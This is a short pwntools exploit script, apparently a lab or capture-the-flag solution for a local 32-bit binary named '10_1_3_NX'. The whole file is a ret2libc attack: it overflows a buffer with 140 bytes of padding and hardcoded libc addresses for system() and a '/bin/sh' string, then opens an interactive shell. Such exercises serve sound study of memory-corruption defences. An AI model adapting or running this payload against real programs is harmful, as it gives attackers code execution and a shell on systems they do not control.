from pwn import *

io = process('./10_1_3_NX')

ret = 0xdeadbeef
system_addr = 0xb7e03d00
bin_sh_addr = 0xb7f4eb62
payload  = b'A' * 140
payload += p32(system_addr)
payload += p32(ret)
payload += p32(bin_sh_addr)

io.send(payload)
io.interactive()
